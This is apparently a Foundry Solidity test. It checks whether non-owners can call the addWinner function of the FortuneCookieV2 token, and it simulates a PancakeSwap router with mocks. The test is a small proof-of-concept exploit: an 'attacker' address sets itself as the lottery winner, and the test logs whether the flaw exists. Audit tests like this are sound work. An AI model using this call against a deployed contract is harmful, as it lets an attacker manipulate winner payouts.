// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FortuneCookieV2.sol";

contract MockWETH {}

contract MockUniswapV2Factory {
    function createPair(address, address) external pure returns (address) {
        return 0x0000000000000000000000000000000000000001;
    }
}

contract MockUniswapV2Router02 {
    address public factory;
    address public WETH;
}

contract FortuneCookieV2Test is Test {
    FortuneCookieV2 token;
    address deployer = address(0x1);
    address constant mockRouterAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    function setUp() public {
        // Deploy mock dependencies
        MockWETH weth = new MockWETH();
        MockUniswapV2Factory factory = new MockUniswapV2Factory();
        
        // Deploy router implementation for bytecode
        MockUniswapV2Router02 mockRouterImpl = new MockUniswapV2Router02();
        
        // Setup simulated PancakeSwap router
        vm.etch(mockRouterAddr, address(mockRouterImpl).code);
        vm.store(
            mockRouterAddr, 
            bytes32(uint256(0)), 
            bytes32(uint256(uint160(address(factory))))
        );
        vm.store(
            mockRouterAddr, 
            bytes32(uint256(1)), 
            bytes32(uint256(uint160(address(weth))))
        );
        
        // Deploy token contract
        vm.startPrank(deployer);
        token = new FortuneCookieV2();
        vm.stopPrank();
    }

    function testPublicAccessAddWinner() public {
        address attacker = address(0xBAD);
        uint256 amount = 777 ether;

        console.log("--- BEFORE-Trigger AddWinner ---");
        // Query state before attack
        (address lastWinnerAddressBefore, uint256 lastWinnerValueBefore) = token.getLastWinner();
        console.log("Initial last winner address:", lastWinnerAddressBefore);
        console.log("Initial last winner value:", lastWinnerValueBefore);
        console.log("--- ------------------------ ---");

        console.log("--- Trigger AddWinner Attack ---");
        // Attacker calls addWinner directly
        vm.prank(attacker);
        token.addWinner(attacker, amount);
        console.log("--- ------------------------- ---");

        console.log("--- AFTER-Trigger AddWinner ---");
        // Query state after attack
        (address lastWinnerAddressAfter, uint256 lastWinnerValueAfter) = token.getLastWinner();
        console.log("Post-attack last winner address:", lastWinnerAddressAfter);
        console.log("Post-attack last winner value:", lastWinnerValueAfter);
        console.log("--- ----------------------- ---");

        // Vulnerability verification
        bool isExploited = (lastWinnerAddressAfter == attacker) && 
                           (lastWinnerValueAfter == amount);
        
        if (isExploited) {
            console.log("Vulnerability Exists: Non-owner successfully manipulated winner state");
        } else {
            console.log("Vulnerability not Exist: Winner state remains unchanged after attack");
        }
    }
}